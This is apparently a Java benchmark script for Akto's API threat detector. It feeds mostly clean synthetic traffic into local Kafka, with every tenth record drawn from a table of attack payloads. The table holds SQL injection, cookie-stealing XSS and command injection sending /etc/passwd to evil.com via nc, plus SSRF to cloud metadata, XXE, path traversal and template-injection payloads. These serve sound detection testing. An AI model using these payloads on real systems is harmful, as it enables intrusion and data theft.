package com.akto.threat.detection.scripts;

import com.akto.threat.detection.kafka.KafkaProtoProducer;
import com.akto.kafka.KafkaConfig;
import com.akto.kafka.KafkaConsumerConfig;
import com.akto.kafka.KafkaProducerConfig;
import com.akto.kafka.Serializer;
import com.akto.proto.http_response_param.v1.StringList;
import com.akto.proto.http_response_param.v1.HttpResponseParam;

import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.function.Supplier;
import java.util.ArrayList;
import java.util.HashMap;

/**
 * Realistic traffic benchmark: 90% clean traffic, 10% malicious (spread across all threat categories).
 * Average payload size ~10KB.
 *
 * Usage: run main() — pushes numRecords messages to local Kafka, then waits for consumer to process.
 */
public class RealisticTrafficBenchmark {

    public static long numRecords = 400000L;

    public static final String THREAT_TOPIC = "akto.api.logs2";
    public static final String KAFKA_URL = "localhost:29092";
    private static final String CONSUMER_GROUP_ID = "akto.threat_detection";
    private static final Random random = new Random(42);

    private static final KafkaConfig kafkaConfig =
        KafkaConfig.newBuilder()
            .setGroupId(CONSUMER_GROUP_ID)
            .setBootstrapServers(KAFKA_URL)
            .setConsumerConfig(
                KafkaConsumerConfig.newBuilder()
                    .setMaxPollRecords(500)
                    .setPollDurationMilli(100)
                    .build())
            .setProducerConfig(
                KafkaProducerConfig.newBuilder().setBatchSize(16384).setLingerMs(100).build())
            .setKeySerializer(Serializer.STRING)
            .setValueSerializer(Serializer.BYTE_ARRAY)
            .build();

    private static final KafkaProtoProducer producer = new KafkaProtoProducer(kafkaConfig);

    // =====================================================================
    //  Clean API endpoints (realistic REST APIs)
    // =====================================================================

    private static final String[][] CLEAN_ENDPOINTS = {
        {"GET",  "/api/v2/users/me"},
        {"GET",  "/api/v2/products?page=1&limit=20&sort=price"},
        {"POST", "/api/v2/orders"},
        {"PUT",  "/api/v2/users/preferences"},
        {"GET",  "/api/v2/inventory/search?q=laptop&category=electronics"},
        {"POST", "/api/v2/auth/refresh"},
        {"GET",  "/api/v2/notifications?unread=true"},
        {"DELETE", "/api/v2/cart/items/12345"},
        {"POST", "/api/v2/payments/checkout"},
        {"GET",  "/api/v2/reports/dashboard?from=2025-01-01&to=2025-03-31"},
        {"PATCH", "/api/v2/settings/account"},
        {"GET",  "/api/v2/analytics/events?type=pageview"},
        {"POST", "/api/v2/webhooks/register"},
        {"GET",  "/api/v2/health"},
        {"POST", "/api/v2/upload/avatar"},
    };

    private static final String[] CLEAN_IPS = {
        "203.45.167.23", "91.102.34.56", "172.217.14.206", "52.84.23.101",
        "185.60.219.11", "104.16.132.229", "45.33.32.156", "198.51.100.42",
        "64.233.160.0", "157.240.1.35", "23.185.0.2", "76.76.21.21"
    };

    // =====================================================================
    //  Malicious payloads — one per threat category
    //  Each entry: {category_label, method, path, malicious_header_key, malicious_header_value, body_payload}
    //  If header_key is empty, attack is in URL or body only.
    // =====================================================================

    private static final String[][] MALICIOUS_TEMPLATES = {
        // SQL Injection — in URL
        {"SQLi", "GET", "/api/v2/users?id=1' UNION SELECT username,password FROM users--", "", "", ""},

        // SQL Injection — in body
        {"SQLi-body", "POST", "/api/v2/search", "", "",
         "{\"filter\": \"name'; DROP TABLE orders;--\", \"limit\": 10}"},

        // XSS — in URL param
        {"XSS", "GET", "/api/v2/search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>", "", "", ""},

        // XSS — in header
        {"XSS-header", "GET", "/api/v2/products", "referer", "<img src=x onerror=alert(document.cookie)>", ""},

        // NoSQL Injection — in body
        {"NoSQLi", "POST", "/api/v2/auth/login", "", "",
         "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}"},

        // NoSQL Injection — aggregation pipeline
        {"NoSQLi-agg", "POST", "/api/v2/analytics/query", "", "",
         "{\"pipeline\": [{\"$match\": {\"role\": \"admin\"}}, {\"$lookup\": {\"from\": \"secrets\"}}]}"},

        // OS Command Injection — in body
        {"OS-Cmd", "POST", "/api/v2/tools/ping", "", "",
         "{\"host\": \"8.8.8.8; cat /etc/passwd | nc evil.com 4444\"}"},

        // OS Command Injection — command substitution in URL
        {"OS-Cmd-sub", "GET", "/api/v2/files/$(whoami)/config", "", "", ""},

        // Windows Command Injection — in body
        {"Win-Cmd", "POST", "/api/v2/tools/execute", "", "",
         "{\"command\": \"; cmd.exe /c net user admin P@ssw0rd /add\"}"},

        // Windows — powershell in body
        {"Win-PS", "POST", "/api/v2/deploy/script", "", "",
         "{\"script\": \"powershell.exe -EncodedCommand ZABpAHIAIABDADoAXAA=\"}"},

        // SSRF — localhost
        {"SSRF", "POST", "/api/v2/integrations/webhook", "", "",
         "{\"callback_url\": \"http://127.0.0.1:8080/admin/config\"}"},

        // SSRF — cloud metadata
        {"SSRF-meta", "POST", "/api/v2/fetch", "", "",
         "{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}"},

        // LFI — path traversal in URL
        {"LFI", "GET", "/api/v2/files/download?path=../../../../etc/passwd", "", "", ""},

        // LFI — PHP wrapper
        {"LFI-php", "GET", "/api/v2/include?page=php://filter/convert.base64-encode/resource=config.php", "", "", ""},

        // XXE — in body
        {"XXE", "POST", "/api/v2/import/xml", "", "",
         "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><root>&xxe;</root>"},

        // LDAP Injection — in body
        {"LDAP", "POST", "/api/v2/directory/search", "", "",
         "{\"filter\": \"(|(uid=*)(cn=admin))\"}"},

        // SSTI — Jinja2 in body
        {"SSTI", "POST", "/api/v2/templates/preview", "", "",
         "{\"template\": \"Hello {{config.__class__.__init__.__globals__['os'].popen('id').read()}}\"}"},

        // SSTI — expression language
        {"SSTI-el", "POST", "/api/v2/render", "", "",
         "{\"expr\": \"${request.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(null,'id')}\"}"},
    };

    // =====================================================================
    //  Main
    // =====================================================================

    public static void main(String[] args) throws Exception {
        System.out.printf("\n\n******* Realistic Traffic Benchmark *******\n\n");
        System.out.printf("Total records: %,d (90%% clean, 10%% malicious)\n", numRecords);
        System.out.printf("Malicious categories: %d templates\n", MALICIOUS_TEMPLATES.length);

        long maliciousCount = numRecords / 10;
        long cleanCount = numRecords - maliciousCount;

        System.out.printf("Clean: %,d | Malicious: %,d\n\n", cleanCount, maliciousCount);

        // Build padded body for ~10KB average
        String paddingBody = generatePaddingPayload(8500);

        long startTime = System.nanoTime();
        long sent = 0;
        long malSent = 0;

        for (long i = 0; i < numRecords; i++) {
            HttpResponseParam record;
            if (i % 10 == 0) {
                // Every 10th record is malicious — rotate through all templates
                int templateIdx = (int)(malSent % MALICIOUS_TEMPLATES.length);
                record = buildMaliciousRecord(MALICIOUS_TEMPLATES[templateIdx], paddingBody);
                malSent++;
            } else {
                record = buildCleanRecord(paddingBody);
            }
            producer.send(THREAT_TOPIC, record);
            sent++;

            if (sent % 1000 == 0) {
                long elapsed = (System.nanoTime() - startTime) / 1_000_000;
                double rate = (sent * 1000.0) / Math.max(elapsed, 1);
                System.out.printf("\rSent %,d / %,d (%.0f msg/sec) [malicious: %,d]", sent, numRecords, rate, malSent);
            }
        }

        long totalMs = (System.nanoTime() - startTime) / 1_000_000;
        double finalRate = (sent * 1000.0) / Math.max(totalMs, 1);
        System.out.printf("\n\nDone. Sent %,d records in %,d ms (%.0f msg/sec)\n", sent, totalMs, finalRate);
        System.out.printf("Malicious: %,d (%d templates, ~%d per template)\n",
                malSent, MALICIOUS_TEMPLATES.length, malSent / MALICIOUS_TEMPLATES.length);
        System.out.println("Waiting 30s for consumer to process...");
        Thread.sleep(30000);
    }

    // =====================================================================
    //  Record builders
    // =====================================================================

    private static HttpResponseParam buildCleanRecord(String paddingBody) {
        String[] endpoint = CLEAN_ENDPOINTS[random.nextInt(CLEAN_ENDPOINTS.length)];
        String method = endpoint[0];
        String path = endpoint[1];
        String ip = CLEAN_IPS[random.nextInt(CLEAN_IPS.length)];

        String requestBody = method.equals("GET") || method.equals("DELETE")
            ? ""
            : "{\"data\": " + paddingBody + "}";

        String responseBody = "{\"status\": \"ok\", \"data\": " + paddingBody + "}";

        return buildRecord(method, path, ip, buildCleanRequestHeaders(ip), buildCleanResponseHeaders(),
                requestBody, responseBody, 200, "OK");
    }

    private static HttpResponseParam buildMaliciousRecord(String[] template, String paddingBody) {
        String method = template[1];
        String path = template[2];
        String malHeaderKey = template[3];
        String malHeaderValue = template[4];
        String malBody = template[5];
        String ip = CLEAN_IPS[random.nextInt(CLEAN_IPS.length)];

        Map<String, StringList> reqHeaders = buildCleanRequestHeaders(ip);
        if (!malHeaderKey.isEmpty()) {
            reqHeaders.put(malHeaderKey, StringList.newBuilder().addValues(malHeaderValue).build());
        }

        // If template has a body payload, use it; otherwise use clean body padded to ~10KB
        String requestBody;
        if (!malBody.isEmpty()) {
            // Pad malicious body to ~10KB average
            requestBody = padToSize(malBody, 9000);
        } else {
            requestBody = "";
        }

        String responseBody = "{\"status\": \"ok\", \"data\": " + paddingBody + "}";
        int statusCode = random.nextInt(10) == 0 ? 401 : 200;
        String status = statusCode == 401 ? "Unauthorized" : "OK";

        return buildRecord(method, path, ip, reqHeaders, buildCleanResponseHeaders(),
                requestBody, responseBody, statusCode, status);
    }

    private static HttpResponseParam buildRecord(
            String method, String path, String ip,
            Map<String, StringList> requestHeaders, Map<String, StringList> responseHeaders,
            String requestBody, String responseBody,
            int statusCode, String status) {

        return HttpResponseParam.newBuilder()
            .setMethod(method)
            .setPath(path)
            .setType("HTTP/1.1")
            .putAllRequestHeaders(requestHeaders)
            .putAllResponseHeaders(responseHeaders)
            .setRequestPayload(requestBody)
            .setResponsePayload(responseBody)
            .setApiCollectionId(123)
            .setStatusCode(statusCode)
            .setStatus(status)
            .setTime((int) (System.currentTimeMillis() / 1000))
            .setAktoAccountId("1000000")
            .setIp(ip)
            .setDestIp("154.248.155.13")
            .setDirection("INBOUND")
            .setIsPending(false)
            .setSource("MIRRORING")
            .setAktoVxlanId("1313121")
            .build();
    }

    // =====================================================================
    //  Headers
    // =====================================================================

    private static Map<String, StringList> buildCleanRequestHeaders(String ip) {
        Map<String, StringList> headers = new HashMap<>();
        headers.put("content-type", sl("application/json"));
        headers.put("authorization", sl("Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.fake"));
        headers.put("host", sl("api.example.com"));
        headers.put("user-agent", sl("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"));
        headers.put("x-forwarded-for", sl(ip));
        headers.put("accept", sl("application/json"));
        headers.put("x-request-id", sl("req-" + random.nextInt(999999)));
        return headers;
    }

    private static Map<String, StringList> buildCleanResponseHeaders() {
        Map<String, StringList> headers = new HashMap<>();
        headers.put("content-type", sl("application/json; charset=utf-8"));
        headers.put("cache-control", sl("no-cache, no-store, must-revalidate"));
        headers.put("x-request-id", sl("resp-" + random.nextInt(999999)));
        headers.put("x-ratelimit-remaining", sl(String.valueOf(random.nextInt(1000))));
        return headers;
    }

    private static StringList sl(String value) {
        return StringList.newBuilder().addValues(value).build();
    }

    // =====================================================================
    //  Payload padding
    // =====================================================================

    /**
     * Generate a realistic-looking JSON payload of approximately targetBytes size.
     */
    private static String generatePaddingPayload(int targetBytes) {
        StringBuilder sb = new StringBuilder(targetBytes + 200);
        sb.append("[");
        int idx = 0;
        while (sb.length() < targetBytes) {
            if (idx > 0) sb.append(",");
            sb.append(String.format(
                "{\"id\":%d,\"name\":\"Item %d\",\"description\":\"Lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua Ut enim ad minim veniam quis nostrud exercitation\",\"price\":%.2f,\"quantity\":%d,\"category\":\"electronics\",\"tags\":[\"sale\",\"popular\",\"new\"],\"metadata\":{\"weight\":%.1f,\"dimensions\":\"10x5x3\",\"color\":\"black\",\"sku\":\"SKU-%06d\"}}",
                idx, idx, 9.99 + (idx % 100), 1 + (idx % 50), 0.5 + (idx % 10), idx));
            idx++;
        }
        sb.append("]");
        return sb.toString();
    }

    /**
     * Pad a malicious body payload to target size by appending a benign JSON field.
     */
    private static String padToSize(String malPayload, int targetBytes) {
        if (malPayload.length() >= targetBytes) return malPayload;
        int needed = targetBytes - malPayload.length() - 50;
        if (needed <= 0) return malPayload;
        StringBuilder padding = new StringBuilder(needed);
        while (padding.length() < needed) {
            padding.append("Lorem ipsum dolor sit amet consectetur adipiscing elit ");
        }
        // Wrap: embed malicious payload inside a larger JSON object
        return "{\"payload\": " + malPayload + ", \"context\": \"" + padding.substring(0, needed) + "\"}";
    }
}
